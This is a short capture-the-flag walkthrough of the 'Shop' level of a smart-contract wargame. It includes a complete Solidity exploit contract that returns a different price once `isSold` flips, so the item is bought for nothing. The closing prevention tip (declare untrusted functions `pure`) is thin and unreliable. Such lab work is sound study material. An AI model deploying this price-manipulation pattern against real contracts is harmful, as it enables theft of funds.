# Shop   
This level is very similar to the elevator level with a little difference.This contract depends on a contract we will deploy, so we can manipulate the returned value to win the game.

## Steps:
1. Deploy an exploiting contract with a view function `price`.
````solidity
pragma solidity ^0.8.0;

abstract contract Shop  {
    bool public isSold;
    function buy() public virtual;
}

contract Buyer{
    Shop shop;
    function price() public view returns (uint){
        if(shop.isSold()){
            return 0;
            }
        else{
            return 100;
        }
    }
    function exploit(address victim) public {
        shop = Shop(victim);
        shop.buy();
    }
}

````
2. Call the exploit function, and you bought it with price 0 :).

The vulnerability is in the boolean `isSold` which is updated before calling the function `price`, and so we can change the output of the price function according to its value.
## How to prevent this.
To prevent this type of problems the untrusted functions should be declared as `pure`.
